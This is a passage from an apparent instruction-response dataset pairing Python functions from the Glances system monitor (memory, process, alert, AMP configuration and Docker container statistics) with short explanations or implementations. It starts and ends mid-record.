len(i['device_name'].split('/')[-1]) <= name_max_width - 3:\n                # If possible concatenate mode info... Glances touch inside :)\n                mnt_point = i['mnt_point'] + ' (' + i['device_name'].split('/')[-1] + ')'\n            elif len(i['mnt_point']) > name_max_width:\n                # Cut mount point name if it is too long\n                mnt_point = '_' + i['mnt_point'][-name_max_width + 1:]\n            else:\n                mnt_point = i['mnt_point']\n            msg = '{:{width}}'.format(nativestr(mnt_point),\n                                      width=name_max_width)\n            ret.append(self.curse_add_line(msg))\n            if args.fs_free_space:\n                msg = '{:>7}'.format(self.auto_unit(i['free']))\n            else:\n                msg = '{:>7}'.format(self.auto_unit(i['used']))\n            ret.append(self.curse_add_line(msg, self.get_views(item=i[self.get_key()],\n                                                               key='used',\n                                                               option='decoration')))\n            msg = '{:>7}'.format(self.auto_unit(i['size']))\n            ret.append(self.curse_add_line(msg))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n            # Grab MEM using the psutil virtual_memory method\n            vm_stats = psutil.virtual_memory()\n\n            # Get all the memory stats (copy/paste of the psutil documentation)\n            # total: total physical memory available.\n            # available: the actual amount of available memory that can be given instantly to processes that request more memory in bytes; this is calculated by summing different memory values depending on the platform (e.g. free + buffers + cached on Linux) and it is supposed to be used to monitor actual memory usage in a cross platform fashion.\n            # percent: the percentage usage calculated as (total - available) / total * 100.\n            # used: memory used, calculated differently depending on the platform and designed for informational purposes only.\n            # free: memory not being used at all (zeroed) that is readily available; note that this doesn\u2019t reflect the actual memory available (use \u2018available\u2019 instead).\n            # Platform-specific fields:\n            # active: (UNIX): memory currently in use or very recently used, and so it is in RAM.\n            # inactive: (UNIX): memory that is marked as not used.\n            # buffers: (Linux, BSD): cache for things like file system metadata.\n            # cached: (Linux, BSD): cache for various things.\n            # wired: (BSD, macOS): memory that is marked to always stay in RAM. It is never moved to disk.\n            # shared: (BSD): memory that may be simultaneously accessed by multiple processes.\n            self.reset()\n            for mem in ['total', 'available', 'percent', 'used', 'free',\n                        'active', 'inactive', 'buffers', 'cached',\n                        'wired', 'shared']:\n                if hasattr(vm_stats, mem):\n                    stats[mem] = getattr(vm_stats, mem)\n\n            # Use the 'free'/htop calculation\n            # free=available+buffer+cached\n            stats['free'] = stats['available']\n            if hasattr(stats, 'buffers'):\n                stats['free'] += stats['buffers']\n            if hasattr(stats, 'cached'):\n                stats['free'] += stats['cached']\n            # used=total-free\n            stats['used'] = stats['total'] - stats['free']\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            if self.short_system_name in ('windows', 'esxi'):\n                # Mem stats for Windows|Vmware Esxi are stored in the FS table\n                try:\n                    fs_stat = self.get_stats_snmp(snmp_oid=snmp_oid[self.short_system_name],\n                                                  bulk=True)\n                except KeyError:\n                    self.reset()\n                else:\n                    for fs in fs_stat:\n                        # The Physical Memory (Windows) or Real Memory (VMware)\n                        # gives statistics on RAM usage and availability.\n                        if fs in ('Physical Memory', 'Real Memory'):\n                            stats['total'] = int(fs_stat[fs]['size']) * int(fs_stat[fs]['alloc_unit'])\n                            stats['used'] = int(fs_stat[fs]['used']) * int(fs_stat[fs]['alloc_unit'])\n                            stats['percent'] = float(stats['used'] * 100 / stats['total'])\n                            stats['free'] = stats['total'] - stats['used']\n                            break\n            else:\n                # Default behavor for others OS\n                stats = self.get_stats_snmp(snmp_oid=snmp_oid['default'])\n\n                if stats['total'] == '':\n                    self.reset()\n                    return self.stats\n\n                for key in iterkeys(stats):\n                    if stats[key] != '':\n                        stats[key] = float(stats[key]) * 1024\n\n                # Use the 'free'/htop calculation\n                stats['free'] = stats['free'] - stats['total'] + (stats['buffers'] + stats['cached'])\n\n                # used=total-free\n                stats['used'] = stats['total'] - stats['free']\n\n                # percent: the percentage usage calculated as (total - available) / total * 100.\n                stats['percent'] = float((stats['total'] - stats['free']) / stats['total'] * 100)\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update RAM memory stats using the input method."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and plugin not disabled\n        if not self.stats or self.is_disable():\n            return ret\n\n        # Build the string message\n        # Header\n        msg = '{}'.format('MEM')\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        msg = ' {:2}'.format(self.trend_msg(self.get_trend('percent')))\n        ret.append(self.curse_add_line(msg))\n        # Percent memory usage\n        msg = '{:>7.1%}'.format(self.stats['percent'] / 100)\n        ret.append(self.curse_add_line(msg))\n        # Active memory usage\n        if 'active' in self.stats:\n            msg = '  {:9}'.format('active:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='active', option='optional')))\n            msg = '{:>7}'.format(self.auto_unit(self.stats['active']))\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='active', option='optional')))\n        # New line\n        ret.append(self.curse_new_line())\n        # Total memory usage\n        msg = '{:6}'.format('total:')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>7}'.format(self.auto_unit(self.stats['total']))\n        ret.append(self.curse_add_line(msg))\n        # Inactive memory usage\n        if 'inactive' in self.stats:\n            msg = '  {:9}'.format('inactive:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='inactive', option='optional')))\n            msg = '{:>7}'.format(self.auto_unit(self.stats['inactive']))\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='inactive', option='optional')))\n        # New line\n        ret.append(self.curse_new_line())\n        # Used memory usage\n        msg = '{:6}'.format('used:')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>7}'.format(self.auto_unit(self.stats['used']))\n        ret.append(self.curse_add_line(\n            msg, self.get_views(key='used', option='decoration')))\n        # Buffers memory usage\n        if 'buffers' in self.stats:\n            msg = '  {:9}'.format('buffers:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='buffers', option='optional')))\n            msg = '{:>7}'.format(self.auto_unit(self.stats['buffers']))\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='buffers', option='optional')))\n        # New line\n        ret.append(self.curse_new_line())\n        # Free memory usage\n        msg = '{:6}'.format('free:')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>7}'.format(self.auto_unit(self.stats['free']))\n        ret.append(self.curse_add_line(msg))\n        # Cached memory usage\n        if 'cached' in self.stats:\n            msg = '  {:9}'.format('cached:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='cached', option='optional')))\n            msg = '{:>7}'.format(self.auto_unit(self.stats['cached']))\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='cached', option='optional')))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nadd an item to the current history.", "response": "def add(self, key, value,\n            description='',\n            history_max_size=None):\n        \"\"\"Add an new item (key, value) to the current history.\"\"\"\n        if key not in self.stats_history:\n            self.stats_history[key] = GlancesAttribute(key,\n                                                       description=description,\n                                                       history_max_size=history_max_size)\n        self.stats_history[key].value = value"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting the history as a dict of list", "response": "def get(self, nb=0):\n        \"\"\"Get the history as a dict of list\"\"\"\n        return {i: self.stats_history[i].history_raw(nb=nb) for i in self.stats_history}"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget the history as a dict of list JSON compliant", "response": "def get_json(self, nb=0):\n        \"\"\"Get the history as a dict of list (with list JSON compliant)\"\"\"\n        return {i: self.stats_history[i].history_json(nb=nb) for i in self.stats_history}"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef load_config(self, config):\n\n        # Read AMP confifuration.\n        # For ex, the AMP foo should have the following section:\n        #\n        # [foo]\n        # enable=true\n        # regex=\\/usr\\/bin\\/nginx\n        # refresh=60\n        #\n        # and optionnaly:\n        #\n        # one_line=false\n        # option1=opt1\n        # ...\n        #\n        amp_section = 'amp_' + self.amp_name\n        if (hasattr(config, 'has_section') and\n                config.has_section(amp_section)):\n            logger.debug(\"AMP - {}: Load configuration\".format(self.NAME))\n            for param, _ in config.items(amp_section):\n                try:\n                    self.configs[param] = config.get_float_value(amp_section, param)\n                except ValueError:\n                    self.configs[param] = config.get_value(amp_section, param).split(',')\n                    if len(self.configs[param]) == 1:\n                        self.configs[param] = self.configs[param][0]\n                logger.debug(\"AMP - {}: Load parameter: {} = {}\".format(self.NAME, param, self.configs[param]))\n        else:\n            logger.debug(\"AMP - {}: Can not find section {} in the configuration file\".format(self.NAME, self.amp_name))\n            return False\n\n        # enable, regex and refresh are mandatories\n        # if not configured then AMP is disabled\n        if self.enable():\n            for k in ['regex', 'refresh']:\n                if k not in self.configs:\n                    logger.warning(\"AMP - {}: Can not find configuration key {} in section {}\".format(self.NAME, k, self.amp_name))\n                    self.configs['enable'] = 'false'\n        else:\n            logger.debug(\"AMP - {} is disabled\".format(self.NAME))\n\n        # Init the count to 0\n        self.configs['count'] = 0\n\n        return self.enable()", "response": "Load the AMP parameters from the configuration file."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns True|False if the AMP is enabled in the configuration file ( enable = true|false.", "response": "def enable(self):\n        \"\"\"Return True|False if the AMP is enabled in the configuration file (enable=true|false).\"\"\"\n        ret = self.get('enable')\n        if ret is None:\n            return False\n        else:\n            return ret.lower().startswith('true')"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef one_line(self):\n        ret = self.get('one_line')\n        if ret is None:\n            return False\n        else:\n            return ret.lower().startswith('true')", "response": "Return True|False if the AMP shoukd be displayed in oneline ( one_lineline = true|false."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef should_update(self):\n        if self.timer.finished():\n            self.timer.set(self.refresh())\n            self.timer.reset()\n            return self.enable()\n        return False", "response": "Return True is the AMP should be updated"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef set_result(self, result, separator=''):\n        if self.one_line():\n            self.configs['result'] = str(result).replace('\\n', separator)\n        else:\n            self.configs['result'] = str(result)", "response": "Store the result into the result key of the AMP\n           "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef result(self):\n        ret = self.get('result')\n        if ret is not None:\n            ret = u(ret)\n        return ret", "response": "Return the result of the AMP as a string"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nwraps for the children update method", "response": "def update_wrapper(self, process_list):\n        \"\"\"Wrapper for the children update\"\"\"\n        # Set the number of running process\n        self.set_count(len(process_list))\n        # Call the children update method\n        if self.should_update():\n            return self.update(process_list)\n        else:\n            return self.result()"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nupdate processes stats using the input method.", "response": "def update(self):\n        \"\"\"Update processes stats using the input method.\"\"\"\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n            # Here, update is call for processcount AND processlist\n            glances_processes.update()\n\n            # Return the processes count\n            stats = glances_processes.getcount()\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            # Not avalaible\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and display plugin enable...\n        if args.disable_process:\n            msg = \"PROCESSES DISABLED (press 'z' to display)\"\n            ret.append(self.curse_add_line(msg))\n            return ret\n\n        if not self.stats:\n            return ret\n\n        # Display the filter (if it exists)\n        if glances_processes.process_filter is not None:\n            msg = 'Processes filter:'\n            ret.append(self.curse_add_line(msg, \"TITLE\"))\n            msg = ' {} '.format(glances_processes.process_filter)\n            if glances_processes.process_filter_key is not None:\n                msg += 'on column {} '.format(glances_processes.process_filter_key)\n            ret.append(self.curse_add_line(msg, \"FILTER\"))\n            msg = '(\\'ENTER\\' to edit, \\'E\\' to reset)'\n            ret.append(self.curse_add_line(msg))\n            ret.append(self.curse_new_line())\n\n        # Build the string message\n        # Header\n        msg = 'TASKS'\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        # Compute processes\n        other = self.stats['total']\n        msg = '{:>4}'.format(self.stats['total'])\n        ret.append(self.curse_add_line(msg))\n\n        if 'thread' in self.stats:\n            msg = ' ({} thr),'.format(self.stats['thread'])\n            ret.append(self.curse_add_line(msg))\n\n        if 'running' in self.stats:\n            other -= self.stats['running']\n            msg = ' {} run,'.format(self.stats['running'])\n            ret.append(self.curse_add_line(msg))\n\n        if 'sleeping' in self.stats:\n            other -= self.stats['sleeping']\n            msg = ' {} slp,'.format(self.stats['sleeping'])\n            ret.append(self.curse_add_line(msg))\n\n        msg = ' {} oth '.format(other)\n        ret.append(self.curse_add_line(msg))\n\n        # Display sort information\n        try:\n            sort_human = self.sort_for_human[glances_processes.sort_key]\n        except KeyError:\n            sort_human = '?'\n        if glances_processes.auto_sort:\n            msg = 'sorted automatically'\n            ret.append(self.curse_add_line(msg))\n            msg = ' by {}'.format(sort_human)\n        else:\n            msg = 'sorted by {}'.format(sort_human)\n        ret.append(self.curse_add_line(msg))\n\n        # Return the message with decoration\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if display plugin enable...\n        if not self.stats or self.is_disable():\n            return ret\n\n        # Build the string message\n        # Header\n        ret.append(self.curse_add_line(global_message(), \"TITLE\"))\n        # Loop over alerts\n        for alert in self.stats:\n            # New line\n            ret.append(self.curse_new_line())\n            # Start\n            msg = str(datetime.fromtimestamp(alert[0]))\n            ret.append(self.curse_add_line(msg))\n            # Duration\n            if alert[1] > 0:\n                # If finished display duration\n                msg = ' ({})'.format(datetime.fromtimestamp(alert[1]) -\n                                     datetime.fromtimestamp(alert[0]))\n            else:\n                msg = ' (ongoing)'\n            ret.append(self.curse_add_line(msg))\n            ret.append(self.curse_add_line(\" - \"))\n            # Infos\n            if alert[1] > 0:\n                # If finished do not display status\n                msg = '{} on {}'.format(alert[2], alert[3])\n                ret.append(self.curse_add_line(msg))\n            else:\n                msg = str(alert[3])\n                ret.append(self.curse_add_line(msg, decoration=alert[2]))\n            # Min / Mean / Max\n            if self.approx_equal(alert[6], alert[4], tolerance=0.1):\n                msg = ' ({:.1f})'.format(alert[5])\n            else:\n                msg = ' (Min:{:.1f} Mean:{:.1f} Max:{:.1f})'.format(\n                    alert[6], alert[5], alert[4])\n            ret.append(self.curse_add_line(msg))\n            # Top processes\n            top_process = ', '.join([p['name'] for p in alert[9]])\n            if top_process != '':\n                msg = ': {}'.format(top_process)\n                ret.append(self.curse_add_line(msg))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef approx_equal(self, a, b, tolerance=0.0):\n        if str(int(a)).isdigit() and str(int(b)).isdigit():\n            return abs(a - b) <= max(abs(a), abs(b)) * tolerance\n        else:\n            return a == b", "response": "Compare a with b using the tolerance ( if numerical )."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nexport the stats to the JSON file.", "response": "def export(self, name, columns, points):\n        \"\"\"Export the stats to the JSON file.\"\"\"\n\n        # Check for completion of loop for all exports\n        if name == self.plugins_to_export()[0] and self.buffer != {}:\n            # One whole loop has been completed\n            # Flush stats to file\n            logger.debug(\"Exporting stats ({}) to JSON file ({})\".format(\n                listkeys(self.buffer),\n                self.json_filename)\n            )\n\n            # Export stats to JSON file\n            data_json = json.dumps(self.buffer)\n            self.json_file.write(\"{}\\n\".format(data_json))\n\n            # Reset buffer\n            self.buffer = {}\n\n        # Add current stat to the buffer\n        self.buffer[name] = dict(zip(columns, points))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef exit(self):\n        for t in itervalues(self.thread_list):\n            t.stop()\n        # Call the father class\n        super(Plugin, self).exit()", "response": "Overwrite the exit method to close threads."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_export(self):\n        ret = []\n        try:\n            ret = self.stats['containers']\n        except KeyError as e:\n            logger.debug(\"docker plugin - Docker export error {}\".format(e))\n        return ret", "response": "Overwrite the default export method."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef connect(self):\n        try:\n            ret = docker.from_env()\n        except Exception as e:\n            logger.error(\"docker plugin - Can not connect to Docker ({})\".format(e))\n            ret = None\n\n        return ret", "response": "Connect to the Docker server."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the all tag of the Glances or Docker configuration file.", "response": "def _all_tag(self):\n        \"\"\"Return the all tag of the Glances/Docker configuration file.\n\n        # By default, Glances only display running containers\n        # Set the following key to True to display all containers\n        all=True\n        \"\"\"\n        all_tag = self.get_conf_value('all')\n        if len(all_tag) == 0:\n            return False\n        else:\n            return all_tag[0].lower() == 'true'"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        # The Docker-py lib is mandatory\n        if import_error_tag:\n            return self.stats\n\n        if self.input_method == 'local':\n            # Update stats\n\n            # Docker version\n            # Exemple: {\n            #     \"KernelVersion\": \"3.16.4-tinycore64\",\n            #     \"Arch\": \"amd64\",\n            #     \"ApiVersion\": \"1.15\",\n            #     \"Version\": \"1.3.0\",\n            #     \"GitCommit\": \"c78088f\",\n            #     \"Os\": \"linux\",\n            #     \"GoVersion\": \"go1.3.3\"\n            # }\n            try:\n                stats['version'] = self.docker_client.version()\n            except Exception as e:\n                # Correct issue#649\n                logger.error(\"{} plugin - Cannot get Docker version ({})\".format(self.plugin_name, e))\n                return self.stats\n\n            # Update current containers list\n            try:\n                # Issue #1152: Docker module doesn't export details about stopped containers\n                # The Docker/all key of the configuration file should be set to True\n                containers = self.docker_client.containers.list(all=self._all_tag()) or []\n            except Exception as e:\n                logger.error(\"{} plugin - Cannot get containers list ({})\".format(self.plugin_name, e))\n                return self.stats\n\n            # Start new thread for new container\n            for container in containers:\n                if container.id not in self.thread_list:\n                    # Thread did not exist in the internal dict\n                    # Create it and add it to the internal dict\n                    logger.debug(\"{} plugin - Create thread for container {}\".format(self.plugin_name, container.id[:12]))\n                    t = ThreadDockerGrabber(container)\n                    self.thread_list[container.id] = t\n                    t.start()\n\n            # Stop threads for non-existing containers\n            nonexisting_containers = set(iterkeys(self.thread_list)) - set([c.id for c in containers])\n            for container_id in nonexisting_containers:\n                # Stop the thread\n                logger.debug(\"{} plugin - Stop thread for old container {}\".format(self.plugin_name, container_id[:12]))\n                self.thread_list[container_id].stop()\n                # Delete the item from the dict\n                del self.thread_list[container_id]\n\n            # Get stats for all containers\n            stats['containers'] = []\n            for container in containers:\n                # Init the stats for the current container\n                container_stats = {}\n                # The key is the container name and not the Id\n                container_stats['key'] = self.get_key()\n                # Export name (first name in the Names list, without the /)\n                container_stats['name'] = nativestr(container.name)\n                # Export global Names (used by the WebUI)\n                container_stats['Names'] = [nativestr(container.name)]\n                # Container Id\n                container_stats['Id'] = container.id\n                # Container Image\n                container_stats['Image'] = container.image.tags\n                # Global stats (from attrs)\n                container_stats['Status'] = container.attrs['State']['Status']\n                container_stats['Command'] = container.attrs['Config']['Entrypoint']\n                # Standards stats\n                if container_stats['Status'] in ('running', 'paused'):\n                    container_stats['cpu'] = self.get_docker_cpu(container.id, self.thread_list[container.id].stats)\n                    container_stats['cpu_percent'] = container_stats['cpu'].get('total', None)\n                    container_stats['memory'] = self.get_docker_memory(container.id, self.thread_list[container.id].stats)\n                    container_stats['memory_usage'] = container_stats['memory'].get('usage', None)\n                    container_stats['io'] = self.get_docker_io(container.id, self.thread_list[container.id].stats)\n                    container_stats['io_r'] = container_stats['io'].get('ior', None)\n                    container_stats['io_w'] = container_stats['io'].get('iow', None)\n                    container_stats['network'] = self.get_docker_network(container.id, self.thread_list[container.id].stats)\n                    container_stats['network_rx'] = container_stats['network'].get('rx', None)\n                    container_stats['network_tx'] = container_stats['network'].get('tx', None)\n                else:\n                    container_stats['cpu'] = {}\n                    container_stats['cpu_percent'] = None\n                    container_stats['memory'] = {}\n                    container_stats['memory_percent'] = None\n                    container_stats['io'] = {}\n                    container_stats['io_r'] = None\n                    container_stats['io_w'] = None\n                    container_stats['network'] = {}\n                    container_stats['network_rx'] = None\n                    container_stats['network_tx'] = None\n                # Add current container stats to the stats list\n                stats['containers'].append(container_stats)\n\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            # Not available\n            pass\n\n        # Sort and update the stats\n        self.stats = sort_stats(stats)\n\n        return self.stats", "response": "Update the internal dict with the current stats using the input method."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_docker_cpu(self, container_id, all_stats):\n        cpu_new = {}\n        ret = {'total': 0.0}\n\n        # Read the stats\n        # For each container, you will find a pseudo-file cpuacct.stat,\n        # containing the CPU usage accumulated by the processes of the container.\n        # Those times are expressed in ticks of 1/USER_HZ of a second.\n        # On x86 systems, USER_HZ is 100.\n        try:\n            cpu_new['total'] = all_stats['cpu_stats']['cpu_usage']['total_usage']\n            cpu_new['system'] = all_stats['cpu_stats']['system_cpu_usage']\n            cpu_new['nb_core'] = len(all_stats['cpu_stats']['cpu_usage']['percpu_usage'] or [])\n        except KeyError as e:\n            # all_stats do not have CPU information\n            logger.debug(\"docker plugin - Cannot grab CPU usage for container {} ({})\".format(container_id, e))\n            logger.debug(all_stats)\n        else:\n            # Previous CPU stats stored in the cpu_old variable\n            if not hasattr(self, 'cpu_old'):\n                # First call, we init the cpu_old variable\n                self.cpu_old = {}\n                try:\n                    self.cpu_old[container_id] = cpu_new\n                except (IOError, UnboundLocalError):\n                    pass\n\n            if container_id not in self.cpu_old:\n                try:\n                    self.cpu_old[container_id] = cpu_new\n                except (IOError, UnboundLocalError):\n                    pass\n            else:\n                #\n                cpu_delta = float(cpu_new['total'] - self.cpu_old[container_id]['total'])\n                system_delta = float(cpu_new['system'] - self.cpu_old[container_id]['system'])\n                if cpu_delta > 0.0 and system_delta > 0.0:\n                    ret['total'] = (cpu_delta / system_delta) * float(cpu_new['nb_core']) * 100\n\n                # Save stats to compute next stats\n                self.cpu_old[container_id] = cpu_new\n\n        # Return the stats\n        return ret", "response": "Return the CPU usage of a container."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_docker_memory(self, container_id, all_stats):\n        ret = {}\n        # Read the stats\n        try:\n            # Do not exist anymore with Docker 1.11 (issue #848)\n            # ret['rss'] = all_stats['memory_stats']['stats']['rss']\n            # ret['cache'] = all_stats['memory_stats']['stats']['cache']\n            ret['usage'] = all_stats['memory_stats']['usage']\n            ret['limit'] = all_stats['memory_stats']['limit']\n            ret['max_usage'] = all_stats['memory_stats']['max_usage']\n        except (KeyError, TypeError) as e:\n            # all_stats do not have MEM information\n            logger.debug(\"docker plugin - Cannot grab MEM usage for container {} ({})\".format(container_id, e))\n            logger.debug(all_stats)\n        # Return the stats\n        return ret", "response": "Return the container MEMORY."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_docker_network(self, container_id, all_stats):\n        # Init the returned dict\n        network_new = {}\n\n        # Read the rx/tx stats (in bytes)\n        try:\n            netcounters = all_stats[\"networks\"]\n        except KeyError as e:\n            # all_stats do not have NETWORK information\n            logger.debug(\"docker plugin - Cannot grab NET usage for container {} ({})\".format(container_id, e))\n            logger.debug(all_stats)\n            # No fallback available...\n            return network_new\n\n        # Previous network interface stats are stored in the network_old variable\n        if not hasattr(self, 'inetcounters_old'):\n            # First call, we init the network_old var\n            self.netcounters_old = {}\n            try:\n                self.netcounters_old[container_id] = netcounters\n            except (IOError, UnboundLocalError):\n                pass\n\n        if container_id not in self.netcounters_old:\n            try:\n                self.netcounters_old[container_id] = netcounters\n            except (IOError, UnboundLocalError):\n                pass\n        else:\n            # By storing time data we enable Rx/s and Tx/s calculations in the\n            # XML/RPC API, which would otherwise be overly difficult work\n            # for users of the API\n            try:\n                network_new['time_since_update'] = getTimeSinceLastUpdate('docker_net_{}'.format(container_id))\n                network_new['rx'] = netcounters[\"eth0\"][\"rx_bytes\"] - self.netcounters_old[container_id][\"eth0\"][\"rx_bytes\"]\n                network_new['tx'] = netcounters[\"eth0\"][\"tx_bytes\"] - self.netcounters_old[container_id][\"eth0\"][\"tx_bytes\"]\n                network_new['cumulative_rx'] = netcounters[\"eth0\"][\"rx_bytes\"]\n                network_new['cumulative_tx'] = netcounters[\"eth0\"][\"tx_bytes\"]\n            except KeyError as e:\n                # all_stats do not have INTERFACE information\n                logger.debug(\"docker plugin - Cannot grab network interface usage for container {} ({})\".format(container_id, e))\n                logger.debug(all_stats)\n\n            # Save stats to compute next bitrate\n            self.netcounters_old[container_id] = netcounters\n\n        # Return the stats\n        return network_new", "response": "Get the container network usage using the Docker API."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_docker_io(self, container_id, all_stats):\n        # Init the returned dict\n        io_new = {}\n\n        # Read the ior/iow stats (in bytes)\n        try:\n            iocounters = all_stats[\"blkio_stats\"]\n        except KeyError as e:\n            # all_stats do not have io information\n            logger.debug(\"docker plugin - Cannot grab block IO usage for container {} ({})\".format(container_id, e))\n            logger.debug(all_stats)\n            # No fallback available...\n            return io_new\n\n        # Previous io interface stats are stored in the io_old variable\n        if not hasattr(self, 'iocounters_old'):\n            # First call, we init the io_old var\n            self.iocounters_old = {}\n            try:\n                self.iocounters_old[container_id] = iocounters\n            except (IOError, UnboundLocalError):\n                pass\n\n        if container_id not in self.iocounters_old:\n            try:\n                self.iocounters_old[container_id] = iocounters\n            except (IOError, UnboundLocalError):\n                pass\n        else:\n            # By storing time data we enable IoR/s and IoW/s calculations in the\n            # XML/RPC API, which would otherwise be overly difficult work\n            # for users of the API\n            try:\n                # Read IOR and IOW value in the structure list of dict\n                ior = [i for i in iocounters['io_service_bytes_recursive'] if i['op'] == 'Read'][0]['value']\n                iow = [i for i in iocounters['io_service_bytes_recursive'] if i['op'] == 'Write'][0]['value']\n                ior_old = [i for i in self.iocounters_old[container_id]['io_service_bytes_recursive'] if i['op'] == 'Read'][0]['value']\n                iow_old = [i for i in self.iocounters_old[container_id]['io_service_bytes_recursive'] if i['op'] == 'Write'][0]['value']\n            except (TypeError, IndexError, KeyError) as e:\n                # all_stats do not have io information\n                logger.debug(\"docker plugin - Cannot grab block IO usage for container {} ({})\".format(container_id, e))\n            else:\n                io_new['time_since_update'] = getTimeSinceLastUpdate('docker_io_{}'.format(container_id))\n                io_new['ior'] = ior - ior_old\n                io_new['iow'] = iow - iow_old\n                io_new['cumulative_ior'] = ior\n                io_new['cumulative_iow'] = iow\n\n                # Save stats to compute next bitrate\n                self.iocounters_old[container_id] = iocounters\n\n        # Return the stats\n        return io_new", "response": "Get the container IO usage using the Docker API."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist (and non null) and display plugin enable...\n        if not self.stats \\\n           or 'containers' not in self.stats or len(self.stats['containers']) == 0 \\\n           or self.is_disable():\n            return ret\n\n        # Build the string message\n        # Title\n        msg = '{}'.format('CONTAINERS')\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        msg = ' {}'.format(len(self.stats['containers']))\n        ret.append(self.curse_add_line(msg))\n        msg = ' (served by Docker {})'.format(self.stats['version'][\"Version\"])\n        ret.append(self.curse_add_line(msg))\n        ret.append(self.curse_new_line())\n        # Header\n        ret.append(self.curse_new_line())\n        # Get the maximum containers name (cutted to 20 char max)\n        name_max_width = min(20, len(max(self.stats['containers'], key=lambda x: len(x['name']))['name']))\n        msg = ' {:{width}}'.format('Name', width=name_max_width)\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>10}'.format('Status')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>6}'.format('CPU%')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>7}'.format('MEM')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>7}'.format('/MAX')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>7}'.format('IOR/s')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>7}'.format('IOW/s')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>7}'.format('Rx/s')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>7}'.format('Tx/s')\n        ret.append(self.curse_add_line(msg))\n        msg = ' {:8}'.format('Command')\n        ret.append(self.curse_add_line(msg))\n        # Data\n        for container in self.stats['containers']:\n            ret.append(self.curse_new_line())\n            # Name\n            ret.append(self.curse_add_line(self._msg_name(container=container,\n                                                          max_width=name_max_width)))\n            # Status\n            status = self.container_alert(container['Status'])\n            msg = '{:>10}'.format(container['Status'][0:10])\n            ret.append(self.curse_add_line(msg, status))\n            # CPU\n            try:\n                msg = '{:>6.1f}'.format(container['cpu']['total'])\n            except KeyError:\n                msg = '{:>6}'.format('_')\n            ret.append(self.curse_add_line(msg, 